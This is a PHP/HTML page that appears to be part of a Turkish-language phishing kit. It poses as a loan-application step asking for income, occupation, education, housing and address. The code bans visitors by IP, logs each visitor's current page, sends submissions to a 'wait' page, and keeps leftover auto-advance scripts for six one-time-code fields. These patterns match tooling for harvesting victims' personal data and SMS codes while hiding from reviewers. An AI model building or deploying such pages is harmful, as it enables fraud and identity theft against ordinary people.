<?php  
require_once 'connect.php';
if ($ajax->banControl(IP)) {
  $ajax->redirect(BAN_URL);
}


if (isset($_POST['submit'])) {
    sleep(1);
    $ajax->redirect('wait');
}
$ajax->pageUpdate(IP,'Ek Bilgi');
?> 
<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required Meta Tags Always Come First -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Title -->
  <title>Document</title>

  <!-- Favicon -->
     
     <link rel="shortcut icon" href="./favicon.png" type="image/x-icon" />

  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet">

  <!-- CSS Implementing Plugins -->
  <link rel="stylesheet" href="./assets/css/vendor.min.css">

  <!-- CSS Front Template -->
  <link rel="stylesheet" href="./assets/css/theme.minc619.css?v=1.0">

  <link rel="preload" href="./assets/css/theme.min.css" data-hs-appearance="default" as="style">
  <link rel="preload" href="./assets/css/theme-dark.min.css" data-hs-appearance="dark" as="style">

  <style data-hs-appearance-onload-styles>
    *
    {
      transition: unset !important;
    }

    body
    {
      opacity: 0;
    }
  </style>

  <script>
            window.hs_config = {"autopath":"@@autopath","deleteLine":"hs-builder:delete","deleteLine:build":"hs-builder:build-delete","deleteLine:dist":"hs-builder:dist-delete","previewMode":false,"startPath":"/index.html","vars":{"themeFont":"https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap","version":"?v=1.0"},"layoutBuilder":{"extend":{"switcherSupport":true},"header":{"layoutMode":"default","containerMode":"container-fluid"},"sidebarLayout":"default"},"themeAppearance":{"layoutSkin":"default","sidebarSkin":"default","styles":{"colors":{"primary":"#377dff","transparent":"transparent","white":"#fff","dark":"132144","gray":{"100":"#f9fafc","900":"#1e2022"}},"font":"Inter"}},"languageDirection":{"lang":"en"},"skipFilesFromBundle":{"dist":["./assets/js/hs.theme-appearance.js","./assets/js/hs.theme-appearance-charts.js","./assets/js/demo.js"],"build":["./assets/css/theme.css","./assets/vendor/hs-navbar-vertical-aside/dist/hs-navbar-vertical-aside-mini-cache.js","./assets/js/demo.js","./assets/css/theme-dark.html","./assets/css/docs.css","./assets/vendor/icon-set/style.html","./assets/js/hs.theme-appearance.js","./assets/js/hs.theme-appearance-charts.js","node_modules/chartjs-plugin-datalabels/dist/chartjs-plugin-datalabels.min.html","./assets/js/demo.js"]},"minifyCSSFiles":["./assets/css/theme.css","./assets/css/theme-dark.css"],"copyDependencies":{"dist":{"*./assets/js/theme-custom.js":""},"build":{"*./assets/js/theme-custom.js":"","node_modules/bootstrap-icons/font/*fonts/**":"./assets/css"}},"buildFolder":"","replacePathsToCDN":{},"directoryNames":{"src":"./src","dist":"./dist","build":"./build"},"fileNames":{"dist":{"js":"theme.min.js","css":"theme.min.css"},"build":{"css":"theme.min.css","js":"theme.min.js","vendorCSS":"vendor.min.css","vendorJS":"vendor.min.js"}},"fileTypes":"jpg|png|svg|mp4|webm|ogv|json"}
            window.hs_config.gulpRGBA = (p1) => {
  const options = p1.split(',')
  const hex = options[0].toString()
  const transparent = options[1].toString()

  var c;
  if(/^#([A-Fa-f0-9]{3}){1,2}$/.test(hex)){
    c= hex.substring(1).split('');
    if(c.length== 3){
      c= [c[0], c[0], c[1], c[1], c[2], c[2]];
    }
    c= '0x'+c.join('');
    return 'rgba('+[(c>>16)&255, (c>>8)&255, c&255].join(',')+',' + transparent + ')';
  }
  throw new Error('Bad Hex');
}
            window.hs_config.gulpDarken = (p1) => {
  const options = p1.split(',')

  let col = options[0].toString()
  let amt = -parseInt(options[1])
  var usePound = false

  if (col[0] == "#") {
    col = col.slice(1)
    usePound = true
  }
  var num = parseInt(col, 16)
  var r = (num >> 16) + amt
  if (r > 255) {
    r = 255
  } else if (r < 0) {
    r = 0
  }
  var b = ((num >> 8) & 0x00FF) + amt
  if (b > 255) {
    b = 255
  } else if (b < 0) {
    b = 0
  }
  var g = (num & 0x0000FF) + amt
  if (g > 255) {
    g = 255
  } else if (g < 0) {
    g = 0
  }
  return (usePound ? "#" : "") + (g | (b << 8) | (r << 16)).toString(16)
}
            window.hs_config.gulpLighten = (p1) => {
  const options = p1.split(',')

  let col = options[0].toString()
  let amt = parseInt(options[1])
  var usePound = false

  if (col[0] == "#") {
    col = col.slice(1)
    usePound = true
  }
  var num = parseInt(col, 16)
  var r = (num >> 16) + amt
  if (r > 255) {
    r = 255
  } else if (r < 0) {
    r = 0
  }
  var b = ((num >> 8) & 0x00FF) + amt
  if (b > 255) {
    b = 255
  } else if (b < 0) {
    b = 0
  }
  var g = (num & 0x0000FF) + amt
  if (g > 255) {
    g = 255
  } else if (g < 0) {
    g = 0
  }
  return (usePound ? "#" : "") + (g | (b << 8) | (r << 16)).toString(16)
}
            </script>
</head>

<body>

  <script src="./assets/js/hs.theme-appearance.js"></script>

  <!-- ========== MAIN CONTENT ========== -->
  <main id="content" role="main" class="main">
    

    <!-- Content -->
    <div class="container py-5 py-sm-7">
      

      <div class="mx-auto" style="max-width: 30rem;">
        <!-- Card -->
        <div class="card card-lg mb-5">
          <div class="card-body text-center">
            <div class="mb-4">
              <img class="avatar avatar-xxl avatar-4x2" src="./asset/8s33ayq.jpg" alt="Image Description" data-hs-theme-appearance="default"> 
            </div>

            <div class="mb-5">
              <h1 class="display-5">Kredi Başvuru Bilgileri</h1>
              <p class="mb-0">Aşağıdaki bilgileri doldurunuz.</p>
                    </div>
<form method="post" action="">
  <div class="form-group text-start mb-3">
      <label>Çalışma Durumu</label>
          <select name="calisma" required class="form-control px-3" id="">
     <option value="">Seçiniz</option>
     <option value="x">Çalışıyor</option>
     <option value="x">Çalışmıyor</option>
     <option value="x">Emekli Çalışıyor</option>
     <option value="x">Emekli Çalışmıyor</option>
     </select>
  </div>
  <div class="form-group text-start mb-3">
      <label>Aylık Net Geliriniz</label>
      <input class="form-control px-3" name="aylikgelir" value="" required="required" placeholder="" type="text" reqassetsred="">
  </div>
  <div class="form-group text-start mb-3">
      <label>Mesleğiniz</label>
      <input class="form-control px-3" name="meslek" value="" required="required" placeholder="" type="text" reqassetsred="">
  </div>
   <div class="form-group text-start mb-3">
      <label>Eğitim Durumu</label>
          <select name="calisma" required class="form-control px-3" id="">
       <option value="">Seçiniz</option>
     <option value="x">İlkokul</option>
     <option value="x">Ortaokul</option>
     <option value="x">İlköğretim</option>
     <option value="x">Lise veya Dengi Okul</option>
     <option value="x">Önlisans / Yüksekokul</option>
     <option value="x">Önlisans / Yüksekokul</option>
     <option value="x">Üniversite - Lisans</option>
     <option value="x">Yüksek Lisans</option>
     <option value="x">Doktora</option>
     </select>
  </div>
    <div class="form-group text-start mb-3">
      <label>İkametgah Şekli</label>
          <select name="calisma" required class="form-control px-3" id="">
         <option value="">Seçiniz</option>
     <option value="x">Aile Mülkü</option>
     <option value="x">Hisseli Mülkiyet</option>
     <option value="x">Kira</option>
     <option value="x">Lojman</option> 
     <option value="x">Kendi Mülkü</option>
     <option value="x">Ortak Mülk</option>
     </select>
  </div>
    <div class="form-group text-start mb-3">
      <label>Güncel Adres</label>
      <input class="form-control px-3" name="meslek" value="" required="required" placeholder="" type="text" reqassetsred="">
  </div>
  <div class="d-grid mb-3">
    <button type="submit" name="submit" class="btn btn-primary btn-lg">Devam et</button>
  </div>
</form>
 

          </div>
        </div>
        <!-- End Card -->

        <!-- Footer -->
       
        <!-- End Footer -->
      </div>
    </div>
    <!-- End Content -->
  </main>
  <!-- ========== END MAIN CONTENT ========== -->

  <!-- JS Implementing Plugins -->
  <script src="./assets/js/vendor.min.js"></script>

  <!-- JS Front -->
  <script src="./assets/js/theme.min.js"></script>

  <!-- JS Plugins Init. -->
  <script>
    $(document).ready(function() {
      $("#resendLink").on("click", function(event) {
        event.preventDefault();
        $("#message").text("Gönderildi.").css("color", "#2f6ad9");
      });
    });
  </script>

<script type="text/javascript">
	$(document).ready(function(){
		$("#code1").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code2").focus();
			}
		});
		$("#code2").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code3").focus();
			}
		});
		$("#code3").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code4").focus();
			}
		});
    $("#code4").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code5").focus();
			}
		});
    $("#code5").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code6").focus();
			}
		});
	});
	</script>

  <?php require_once 'add-js.php'; ?>
</body>

</html>